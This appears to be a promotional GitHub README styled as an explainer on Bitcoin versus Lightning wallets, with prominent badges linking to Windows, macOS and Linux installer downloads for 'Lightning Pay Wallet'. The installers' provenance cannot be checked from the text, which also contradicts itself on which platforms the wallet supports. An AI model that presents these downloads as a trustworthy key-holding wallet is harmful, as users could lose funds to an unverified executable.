<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Bitcoin wallet vs Lightning wallet: where Lightning Pay Wallet fits
A Lightning wallet is a Bitcoin wallet with a second payment layer attached; the bitcoin is the same bitcoin.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**
A Bitcoin wallet holds keys and moves coins on the chain. A Lightning wallet does the same thing and adds a second layer that settles payments off-chain in seconds, then reconciles to the chain when a channel closes. Lightning Pay Wallet is the second kind: a desktop wallet for Windows and macOS that holds your keys and pays over Lightning.

## What a Lightning wallet is

A Lightning wallet is software that holds your bitcoin keys and can also send and receive over the Lightning Network, a payment layer that runs on top of Bitcoin. The coins are bitcoin; the layer only changes how a payment travels.

That is the whole distinction, and most confusion about the category comes from missing it. A Lightning wallet is not a different asset, a different chain or a token. It is a bitcoin wallet with a second way to move the same bitcoin, and it can still hold an ordinary on-chain balance for the times when speed does not matter.

## How the Lightning Network works

The Lightning Network is a mesh of payment channels between nodes. Two parties lock bitcoin into a channel with an on-chain transaction, then exchange signed updates inside it; each payment is a new balance, not a new on-chain transaction, and only the final balances touch the chain when the channel closes.

Routing makes it a network rather than a series of private tabs. A payment can hop across several channels to reach someone you have no channel with, and each hop takes a small fee. That is why a payment arrives in seconds without a block being mined: nothing was broadcast, only a chain of signed commitments updated.

The network is not a blockchain. It has no blocks and no miners of its own; it borrows Bitcoin's security for the two moments that matter, opening a channel and closing it.

## Lightning versus the Bitcoin network

The Bitcoin network settles on-chain: a transaction is broadcast, waits for a block, and is final when confirmed. The Lightning Network settles between confirmations: a payment completes in under a second and is final immediately, because both sides signed the new balance.

The trade is capacity for convenience. On-chain can move any amount to any address and needs no counterparty online; Lightning needs a channel with enough capacity on the right side, and it needs the other node reachable. Neither replaces the other, which is why a wallet that speaks both is the practical choice: on-chain for settlement and storage, Lightning for spending, as [sending and receiving Lightning payments](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-send-and-receive.md) sets out.

## Speed, cost and what a satoshi is

A Lightning payment in Lightning Pay Wallet completes in seconds, usually under one, and costs a routing fee of a fraction of a satoshi. An on-chain payment takes minutes to hours depending on block space and pays a miner fee measured in satoshis per virtual byte.

A satoshi is the smallest unit of bitcoin: one hundred million of them make one bitcoin, so a satoshi is worth a tiny fraction of a cent at any plausible price. Lightning fees are small enough that they are usually quoted in satoshis, and that is the clearest sign of why the layer exists: paying a few satoshis to move a payment is only possible when the payment never touches a block.

## Is Lightning free, and is it legit?

Lightning is not free, but it is close enough that the difference rarely matters: routing fees are typically a fraction of a satoshi per payment, and a channel costs an on-chain fee to open. The wallet itself charges nothing.

"Is it legit" has a clean answer too. Lightning is not a company or a token sale; it is an open protocol implemented by many independent wallets and nodes, specified publicly, and secured by Bitcoin's own consensus at the points where it touches the chain. A wallet that speaks Lightning is using a standard, not a service. What varies between wallets is custody and quality, which is a different question from whether the layer is real.

No single company owns the network. It is run by the people and businesses operating nodes, and no operator can unilaterally change the rules; protocol changes go through the same public review as any Bitcoin change.

## Getting a Bitcoin Lightning wallet

You get a Lightning wallet by downloading one and creating a wallet inside it, which generates a recovery phrase and, in most wallets, opens a channel so you can receive. There is no sign-up, no address to request from a provider and no approval step.

In Lightning Pay Wallet the sequence is: install the desktop application, create a wallet, write down the phrase, then send or receive. [what Lightning Pay Wallet is and whether it is safe](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-what-it-is-and-is-it-safe.md) covers what the product is and what it does not claim.

A Lightning address is a different thing from a wallet address, and the two are not created together. An on-chain address is derived from your keys; a Lightning address is a human-readable alias that forwards to an invoice, usually through a provider. If you want one that is not tied to a provider, you run a server that maps the alias to your own node, and most people decide the alias is not worth that.

## Sending between wallets and exchanges

You can send bitcoin from an ordinary on-chain wallet to a Lightning wallet, but not as a Lightning payment: you send to the wallet's on-chain address, and the funds arrive on-chain. Moving them into a channel is a second step the wallet handles. Sending a Lightning payment to an on-chain address fails, and the reverse fails as well.

An exchange can pay a Lightning invoice directly if it offers Lightning withdrawals, which appears as a choice of network in its withdrawal screen. If the choice is not there, the exchange is on-chain only and the payment will not arrive over Lightning, however it is labelled. Asking which network before sending is the habit that prevents this class of loss.

## Which Lightning wallet is the best?

The best Lightning wallet is the one that matches how you hold the money: a self-custodial desktop wallet for a spending balance you control, a mobile wallet for daily payments, a custodial app for small convenience amounts. "Best" is a fit question, and the ranking changes with the job.

Four criteria do most of the work. Does it hold your keys? Does it run on the platform you actually use? Can you explain its backup in one sentence? And does its build come from a source you can verify? A wallet that fails the first or the last is disqualified no matter how good its interface is.

A large user base is not a criterion. The most-installed wallets are often custodial, because custody is what makes an app simple, and simplicity is what makes it popular. That is a legitimate trade, but it is a trade, not a quality ranking.

For a straight comparison of the desktop options and what each one optimises for, the next page in this set takes them one by one.

## Questions people ask

### Can I hold bitcoin in a Lightning wallet without using Lightning?

Yes. Most Lightning wallets also hold an on-chain balance in the same application, and you can receive and send on-chain without ever opening a channel. Lightning is an extra payment method, not a requirement.

### Is a Lightning wallet the same as a bitcoin wallet?

It is a bitcoin wallet with an extra layer. The keys, the asset and the backup standard are the same; what is added is the ability to move bitcoin through channels without an on-chain transaction.

### Do I need to run a node to use Lightning?

No. A wallet like Lightning Pay Wallet manages channels for you, which means you get the payment layer without the server, the liquidity management and the command line. Running your own node buys independence and control, at the cost of maintenance.

### What happens to my bitcoin if I stop using the wallet?

The keys stay valid and the balance stays yours. A channel that is left alone for long enough may be closed by its counterparty, which settles your side back on-chain after a delay, so keep the channel backup if the wallet produces one.

### Is Lightning Pay Wallet a bitcoin wallet or a Lightning wallet?

Both, in the sense that matters: it holds your keys and an on-chain balance, and it pays over Lightning. What it holds and what you control is set out in [self-custody: what you hold](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-self-custody.md).
